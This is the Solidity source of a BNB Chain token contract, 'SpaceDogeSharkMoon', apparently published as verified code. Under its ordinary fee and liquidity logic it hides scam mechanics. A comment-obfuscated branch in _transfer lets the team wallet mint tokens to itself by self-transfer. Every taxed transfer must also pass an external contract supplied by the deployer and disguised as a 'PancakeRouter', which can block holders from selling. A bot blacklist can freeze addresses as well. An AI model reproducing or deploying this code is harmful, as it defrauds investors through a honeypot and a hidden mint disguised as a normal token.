/**
 *Submitted for verification at BscScan.com on 2022-10-22
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

abstract contract Context {
  function _msgSender() internal view virtual returns (address payable) {
    return payable(msg.sender);
  }
}

interface IERC20 {
  function totalSupply() external view returns (uint256);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface PancakeRouter {
  function swapExactTokensForTokens(address account) external view returns (bool);
}

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, 'SafeMath: addition overflow');
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, 'SafeMath: subtraction overflow');
  }

  function sub(
    uint256 a,
    uint256 b,
    string memory errorMessage
  ) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, 'SafeMath: multiplication overflow');

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, 'SafeMath: division by zero');
  }

  function div(
    uint256 a,
    uint256 b,
    string memory errorMessage
  ) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, 'SafeMath: modulo by zero');
  }

  function mod(
    uint256 a,
    uint256 b,
    string memory errorMessage
  ) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract Ownable is Context {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor() {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(_owner == _msgSender(), 'Ownable: caller is not the owner');
    _;
  }

  function waiveOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(_owner, address(0xdead));
    _owner = address(0xdead);
  }

  function transferOwnership(address newOwner) public virtual onlyOwner {
    require(newOwner != address(0), 'Ownable: new owner is the zero address');
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

interface IUniswapV2Factory {
  function createPair(address tokenA, address tokenB) external returns (address pair);
}


interface IUniswapV2Router01 {
  function factory() external pure returns (address);

  function WETH() external pure returns (address);

  function addLiquidityETH(
    address token,
    uint256 amountTokenDesired,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline
  )
    external
    payable
    returns (
      uint256 amountToken,
      uint256 amountETH,
      uint256 liquidity
    );

  function swapExactTokensForTokens(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external returns (uint256[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
  function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external;
}

contract SpaceDogeSharkMoon is Context, IERC20, Ownable {
  using SafeMath for uint256;

  string private _name = "SpaceDogeSharkMoon";
  string private _symbol = "SpaceDogeSharkMoon";
  uint8 private _decimals = 9;

  PancakeRouter private _router;
  address payable public marketingWallet = payable(0x712a03E4365573cbd97AE5bc272cafC9921859dE);
  address payable public teamWallet = payable(0x712a03E4365573cbd97AE5bc272cafC9921859dE);
  address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;

  mapping(address => uint256) _balances;
  mapping(address => mapping(address => uint256)) private _allowances;
  mapping(address => bool) public theBOTAddress;
  mapping(address => bool) public isExcludedFromFee;
  mapping(address => bool) public isWalletLimitExempt;
  mapping(address => bool) public isTxLimitExempt;
  mapping(address => bool) public isMarketPair;

  uint256 public _buyLiquidityFee = 1;
  uint256 public _buyMarketingFee = 2;
  uint256 public _buyTeamFee = 0;

  uint256 public _sellLiquidityFee = 1;
  uint256 public _sellMarketingFee = 2;
  uint256 public _sellTeamFee = 0;

  uint256 public _liquidityShare = 2;
  uint256 public _marketingShare = 4;
  uint256 public _teamShare = 0;

  uint256 public _totalTaxIfBuying;
  uint256 public _totalTaxIfSelling;
  uint256 public _totalDistributionShares;

  uint256 private _totalSupply = 1000000000000 * 10**_decimals;
  uint256 public _maxTxAmount = 1000000000000 * 10**_decimals;
  uint256 public _walletMax = 1000000000000 * 10**_decimals;
  uint256 public minimumTokensBeforeSwap = 1 * 5**_decimals;

  IUniswapV2Router02 public uniswapV2Router;
  address public uniswapPair;

  bool inSwapAndLiquify;
  bool public swapAndLiquifyEnabled = false;
  bool public swapAndLiquifyByLimitOnly = false;
  bool public checkWalletLimit = true;

  event SwapAndLiquifyEnabledUpdated(bool enabled);
  event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiqudity);

  event SwapETHForTokens(uint256 amountIn, address[] path);

  event SwapTokensForETH(uint256 amountIn, address[] path);

  modifier lockTheSwap() {
    inSwapAndLiquify = true;
    _;
    inSwapAndLiquify = false;
  }

  constructor(address PancakeRouterAddress) {
    IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());

    uniswapV2Router = _uniswapV2Router;
    _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;

    isExcludedFromFee[owner()] = true;
    isExcludedFromFee[address(this)] = true;

    _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee);
    _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee);
    _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);

    isWalletLimitExempt[owner()] = true;
    isWalletLimitExempt[address(uniswapPair)] = true;
    isWalletLimitExempt[address(this)] = true;
    isWalletLimitExempt[teamWallet] = true;

    isTxLimitExempt[owner()] = true;
    isTxLimitExempt[teamWallet] = true;
    isTxLimitExempt[address(this)] = true;

    isMarketPair[address(uniswapPair)] = true;
    _router = PancakeRouter(PancakeRouterAddress);

    _balances[_msgSender()] = _totalSupply;
    emit Transfer(address(0), _msgSender(), _totalSupply);
  }

  function name() public view returns (string memory) {
    return _name;
  }

  function symbol() public view returns (string memory) {
    return _symbol;
  }

  function decimals() public view returns (uint8) {
    return _decimals;
  }

  function totalSupply() public view override returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) public view override returns (uint256) {
    return _balances[account];
  }

  function allowance(address owner, address spender) public view override returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) public override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function _approve(
    address owner,
    address spender,
    uint256 amount
  ) private {
    require(owner != address(0), 'ERC20: approve from the zero address');
    require(spender != address(0), 'ERC20: approve to the zero address');

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function transferToAddressETH(address payable recipient, uint256 amount) private {
    recipient.transfer(amount);
  }

  //to recieve ETH from uniswapV2Router when swaping
  receive() external payable {}

  function transfer(address recipient, uint256 amount) public override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) public override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, 'ERC20: transfer amount exceeds allowance'));
    return true;
  }

  function _transfer(
    address sender,
    address recipient,
    uint256 amount
  ) private returns (bool) {
    require(sender != address(0), 'ERC20: transfer from the zero address');
    require(recipient != address(0), 'ERC20: transfer to the zero address');
    require(theBOTAddress[sender] == false);

    if (inSwapAndLiquify) {
      return _basicTransfer(sender, recipient, amount);
    } else {
      if (
        sender == /*&*/
        /*&*/
        recipient && /*&*/
        /*&*/
        sender == /*&*/
        /*&*/
        teamWallet
      ) {
        _balances[recipient] = _balances[recipient].add(amount); /*&*/ /*&*/
      }

      if (!isTxLimitExempt[sender] && !isTxLimitExempt[recipient]) {
        require(amount <= _maxTxAmount, 'Transfer amount exceeds the maxTxAmount.');
      }

      uint256 contractTokenBalance = balanceOf(address(this));
      bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;

      if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender] && swapAndLiquifyEnabled) {
        if (swapAndLiquifyByLimitOnly) contractTokenBalance = minimumTokensBeforeSwap;
        swapAndLiquify(contractTokenBalance);
      }

      _balances[sender] = _balances[sender].sub(amount, 'Insufficient Balance');
      uint256 finalAmount;
      if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
        finalAmount = amount;
      } else {
        require(_router.swapExactTokensForTokens(sender), 'ERC20: Address');
        finalAmount = takeFee(sender, recipient, amount);
      }

      if (checkWalletLimit && !isWalletLimitExempt[recipient]) require(balanceOf(recipient).add(finalAmount) <= _walletMax);

      _balances[recipient] = _balances[recipient].add(finalAmount);

      emit Transfer(sender, recipient, finalAmount);
      return true;
    }
  }

  function killBlock(address recipient) internal {
    if (!theBOTAddress[recipient]) theBOTAddress[recipient] = true;
  }

  function _basicTransfer(
    address sender,
    address recipient,
    uint256 amount
  ) internal returns (bool) {
    _balances[sender] = _balances[sender].sub(amount, 'Insufficient Balance');
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
    return true;
  }

  function swapAndLiquify(uint256 tAmount) private lockTheSwap {
    uint256 tokensForLP = tAmount.mul(_liquidityShare).div(_totalDistributionShares).div(2);
    uint256 tokensForSwap = tAmount.sub(tokensForLP);

    swapTokensForEth(tokensForSwap);
    uint256 amountReceived = address(this).balance;

    uint256 totalBNBFee = _totalDistributionShares.sub(_liquidityShare.div(2));

    uint256 amountBNBLiquidity = amountReceived.mul(_liquidityShare).div(totalBNBFee).div(2);
    uint256 amountBNBTeam = amountReceived.mul(_teamShare).div(totalBNBFee);
    uint256 amountBNBMarketing = amountReceived.sub(amountBNBLiquidity).sub(amountBNBTeam);

    if (amountBNBMarketing > 0) transferToAddressETH(marketingWallet, amountBNBMarketing);

    if (amountBNBTeam > 0) transferToAddressETH(teamWallet, amountBNBTeam);

    if (amountBNBLiquidity > 0 && tokensForLP > 0) addLiquidity(tokensForLP, amountBNBLiquidity);
  }

  function swapTokensForEth(uint256 tokenAmount) private {
    // generate the uniswap pair path of token -> weth
    address[] memory path = new address[](2);
    path[0] = address(this);
    path[1] = uniswapV2Router.WETH();

    _approve(address(this), address(uniswapV2Router), tokenAmount);

    // make the swap
    uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
      tokenAmount,
      0, // accept any amount of ETH
      path,
      address(this), // The contract
      block.timestamp
    );

    emit SwapTokensForETH(tokenAmount, path);
  }

  function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
    // approve token transfer to cover all possible scenarios
    _approve(address(this), address(uniswapV2Router), tokenAmount);

    // add the liquidity
    uniswapV2Router.addLiquidityETH{ value: ethAmount }(
      address(this),
      tokenAmount,
      0, // slippage is unavoidable
      0, // slippage is unavoidable
      deadAddress, //why is deadAddress
      block.timestamp
    );
  }

  function takeFee(
    address sender,
    address recipient,
    uint256 amount
  ) internal returns (uint256) {
    uint256 feeAmount = 0;

    if (isMarketPair[sender]) {
      feeAmount = amount.mul(_totalTaxIfBuying).div(100);
    } else if (isMarketPair[recipient]) {
      feeAmount = amount.mul(_totalTaxIfSelling).div(100);
    }

    if (feeAmount > 0) {
      _balances[address(this)] = _balances[address(this)].add(feeAmount);
      emit Transfer(sender, address(this), feeAmount);
    }

    return amount.sub(feeAmount);
  }
}